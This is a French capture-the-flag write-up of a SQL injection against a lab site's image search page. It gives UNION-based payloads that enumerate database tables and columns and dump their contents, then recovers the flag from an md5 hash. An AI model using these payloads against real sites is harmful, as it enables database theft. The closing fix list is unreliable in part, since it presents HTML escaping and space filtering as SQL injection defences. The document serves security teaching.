# image injection SQL
Recupere des datas grace a une injection SQL

## Comment obtenir le flag
* Se rendre a `ip`/?page=searchimg
* Si on submit vide, on obtient:
- *You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '' at line 1*
* En testant `1 OR 2`, on constate qu'une requete SQL est donc possible :
- On tombe sur : `First name: Flag` / `Surname : GetThe`
- Notre bible pour les requetes : *http://www.sqlinjection.net/column-names/*

- `TRUE` permet de valider l'expression précédente.
- `UNION` permet de coupler les résultats d'une première requête avec une seconde dont les composantes doivent être les mêmes.

* `TRUE UNION SELECT table_schema, table_name FROM information_schema.tables`
```
schema: Member_images
table: list_images
```

* `TRUE UNION SELECT table_name, column_name FROM information_schema.columns`
```
Table: list_images
Column: id
Column: url
Column: title
Column: comment
```

* Ce qui permet de rechercher 2 par 2 (étant limités par l'UNION) les résultats pour chaques colonnes de la table users:
- `TRUE UNION SELECT title, comment FROM Member_images.list_images`
```
id: 5
url: borntosec.ddns.net/images.png
title: Hack me ?
comment: If you read this just use this md5 decode lowercase then sha256 to win this flag ! : 1928e8083cf461a51303633093573c46
```

* le décryptage de *1928e8083cf461a51303633093573c46* en md5 = *albatroz*
* passé en sha256 donne le flag : *f2a29020ef3132e01dd61df97fd33ec8d7fcd1388cc9601e7db691d17d4d6188*

## Fix possible
Les methodes suivantes permettent efficacement de se proteger contre les injections lorsque des champs sont remplis par l'user :
- `mysql_real_escape_string` (concernant les db),
- `htmlentities()`,
- `htmlspecialchars()`,
- `strip_tags()`,
- `addslashes()`,
- et globalement en utilisant la PDO
Il est aussi de bon usage lorsqu'une requete est faite de vérifier deux clés, lorsque cela est possible, afin d'autoriser l'accès au contenu (ex : le champs demandé est le nom d'utilisateur, mais en backend le code vérifie aussi l'identifiant de l'utilisateur loggé).
Vérifier que la string envoyée ne contient pas d'espaces si cela n'est pas nécessaire
Parser le retour de la requête plutot qu'en envoyer l'intégralité du contenu

## Explications
Il est possible de faire une injection SQL en utilisant `UNION` dans le but d'exposer l'intégralité des bases de données du site et leur contenu.
Cela permet de découvrir notamment et en particulier les mots de passe enregistrés des admin/root.
